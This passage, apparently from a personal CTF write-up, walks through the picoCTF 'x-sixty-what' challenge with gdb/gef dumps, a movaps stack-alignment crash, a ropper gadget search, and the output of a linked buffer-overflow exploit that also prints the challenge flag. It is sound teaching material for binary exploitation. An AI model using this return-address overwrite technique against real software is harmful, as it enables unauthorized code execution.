   0x0000000000401255 <+31>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:    jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:    lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:    lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:    lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:    mov    eax,0x0
   0x000000000040127a <+68>:    call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:    mov    edi,0x0
   0x0000000000401284 <+78>:    call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:    lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:    mov    esi,0x40
   0x0000000000401296 <+96>:    mov    rdi,rax
   0x0000000000401299 <+99>:    call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:   lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:   mov    rdi,rax
   0x00000000004012a5 <+111>:   mov    eax,0x0
   0x00000000004012aa <+116>:   call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:   nop
   0x00000000004012b0 <+122>:   leave  
   0x00000000004012b1 <+123>:   ret    
End of assembler dump.
gef➤
```

We see that indeed the flag is being opened cause the program use fopen to get the flag.txt content

Moving on to the next call

```
gef➤  
0x000000000040129e in flag ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffddd8  →  "flag{fake_flag_for_testing}\n"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7ec102d  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0xfbad2488        
$rsp   : 0x007fffffffddd8  →  "flag{fake_flag_for_testing}\n"
$rbp   : 0x007fffffffde28  →  "AAAAAAAA"
$rsi   : 0x00000000406491  →  "lag{fake_flag_for_testing}\n"
$rdi   : 0x00000000406390  →  0x0000000000000000
$rip   : 0x0000000040129e  →  <flag+104> lea rax, [rbp-0x50]
$r8    : 0x000000004064ac  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddd8│+0x0000: "flag{fake_flag_for_testing}\n"        ← $rax, $rsp
0x007fffffffdde0│+0x0008: "e_flag_for_testing}\n"
0x007fffffffdde8│+0x0010: "or_testing}\n"
0x007fffffffddf0│+0x0018: 0x414141000a7d676e ("ng}\n"?)
0x007fffffffddf8│+0x0020: 0x4141414141414141
0x007fffffffde00│+0x0028: 0x4141414141414141
0x007fffffffde08│+0x0030: 0x4141414141414141
0x007fffffffde10│+0x0038: 0x4141414141414141
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401291 <flag+91>        mov    esi, 0x40
     0x401296 <flag+96>        mov    rdi, rax
     0x401299 <flag+99>        call   0x4010f0 <fgets@plt>
 →   0x40129e <flag+104>       lea    rax, [rbp-0x50]
     0x4012a2 <flag+108>       mov    rdi, rax
     0x4012a5 <flag+111>       mov    eax, 0x0
     0x4012aa <flag+116>       call   0x4010e0 <printf@plt>
     0x4012af <flag+121>       nop    
     0x4012b0 <flag+122>       leave  
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x40129e in flag (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40129e → flag()
[#1] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  disass flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:     endbr64 
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x50
   0x0000000000401242 <+12>:    lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:    jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:    lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:    lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:    lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:    mov    eax,0x0
   0x000000000040127a <+68>:    call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:    mov    edi,0x0
   0x0000000000401284 <+78>:    call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:    lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:    mov    esi,0x40
   0x0000000000401296 <+96>:    mov    rdi,rax
   0x0000000000401299 <+99>:    call   0x4010f0 <fgets@plt>
=> 0x000000000040129e <+104>:   lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:   mov    rdi,rax
   0x00000000004012a5 <+111>:   mov    eax,0x0
   0x00000000004012aa <+116>:   call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:   nop
   0x00000000004012b0 <+122>:   leave  
   0x00000000004012b1 <+123>:   ret    
End of assembler dump.
gef➤
```

We see the flag is `flag{fake_flag_for_testing}` and its stored in the $rsp 

But since this is local that what gives us the opportunity to view the flag but on the remote server we won't be able to run gdb on it and debug 

So we need to find the problem on why it isn't printing the content out

```
gef➤  

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e2773b in buffered_vfprintf (s=0x7ffff7f9c760 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffddd8 "flag{fake_flag_for_testing}\n", args=args@entry=0x7fffffffdcf8, mode_flags=mode_flags@entry=0x0) at ./stdio-common/vfprintf-internal.c:1734
1734    ./stdio-common/vfprintf-internal.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdcb8  →  0x000000004062b0  →  0x00000000fbad2488
$rbx   : 0x007ffff7f9c760  →  0x00000000fbad2887
$rcx   : 0x0               
$rdx   : 0x007fffffffdcf8  →  0x0000003000000008
$rsp   : 0x007fffffffbb98  →  0x0000000000000000
$rbp   : 0x007fffffffde28  →  "AAAAAAAA"
$rsi   : 0x007fffffffddd8  →  "flag{fake_flag_for_testing}\n"
$rdi   : 0x007fffffffbbb8  →  0x0000000000000000
$rip   : 0x007ffff7e2773b  →  <buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0
$r8    : 0x000000004064ac  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x007ffff7de05f8  →  0x10001200004864 ("dH"?)
$r11   : 0x007ffff7e1b450  →  <printf+0> sub rsp, 0xd8
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffbb98│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffbba0│+0x0008: 0x0000000000000000
0x007fffffffbba8│+0x0010: 0x0000000000000000
0x007fffffffbbb0│+0x0018: 0x0000000000000000
0x007fffffffbbb8│+0x0020: 0x0000000000000000     ← $rdi
0x007fffffffbbc0│+0x0028: 0x0000000000000000
0x007fffffffbbc8│+0x0030: 0x0000000000000000
0x007fffffffbbd0│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e27724 <buffered_vfprintf+68> mov    DWORD PTR [rdi+0xc0], 0xffffffff
   0x7ffff7e2772e <buffered_vfprintf+78> lea    rax, [rsp+0x2120]
   0x7ffff7e27736 <buffered_vfprintf+86> lea    rdi, [rsp+0x20]
 → 0x7ffff7e2773b <buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0
   0x7ffff7e27740 <buffered_vfprintf+96> mov    r12, rsp
   0x7ffff7e27743 <buffered_vfprintf+99> mov    QWORD PTR [rsp+0x50], rax
   0x7ffff7e27748 <buffered_vfprintf+104> mov    eax, DWORD PTR [rbx+0x74]
   0x7ffff7e2774b <buffered_vfprintf+107> mov    QWORD PTR [rsp+0x100], rbx
   0x7ffff7e27753 <buffered_vfprintf+115> mov    DWORD PTR [rsp+0x94], eax
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x7ffff7e2773b in buffered_vfprintf (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e2773b → buffered_vfprintf(s=0x7ffff7f9c760 <_IO_2_1_stdout_>, format=0x7fffffffddd8 "flag{fake_flag_for_testing}\n", args=0x7fffffffdcf8, mode_flags=0x0)
[#1] 0x7ffff7e267f3 → __vfprintf_internal(s=<optimized out>, format=0x7fffffffddd8 "flag{fake_flag_for_testing}\n", ap=0x7fffffffdcf8, mode_flags=0x0)
[#2] 0x7ffff7e1b4fb → __printf(format=<optimized out>)
[#3] 0x4012af → flag()
[#4] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Boom!!! We see the error why we didn't get the flag 

At address `0x00007ffff7e2773b` It tried to run `<buffered_vfprintf+91> movaps XMMWORD PTR [rsp+0x40], xmm0` 

So basically this is caused by movap stack allignment. Here's the resource to check out [Resource](https://ropemporium.com/guide.html)

Here's the fix to this problem 

```
The solution is to call the ret of the other address one more time before calling the flag() function when designing the overflow stack attack, so that the rsp address can be reduced by 8
```

Now i'll use ropper tool to get any return address

```
└─$ ropper --file vuln --search "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: vuln
0x000000000040101a: ret; 
```

Now that we have a return address, I'll edit the exploit code to make the rip return to a real return address then return to flag()

Exploit [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/xsixtywhat/exploit.py)

Now i'll run it again

```
└─$ python3 exploit.py                                
[+] Starting local process './vuln': pid 24124
flag{fake_flag_for_testing}
[*] Stopped process './vuln' (pid 24124)
                                          
```

It works 😸

So time to run it on the remote server

```
└─$ python2 exploit.py REMOTE saturn.picoctf.net 54433
[+] Opening connection to saturn.picoctf.net on port 54433: Done
picoCTF{b1663r_15_b3773r_964d9987}
[*] Closed connection to saturn.picoctf.net port 54433
```

And we're done

<br> <br>
[Back To Home](../index.md)
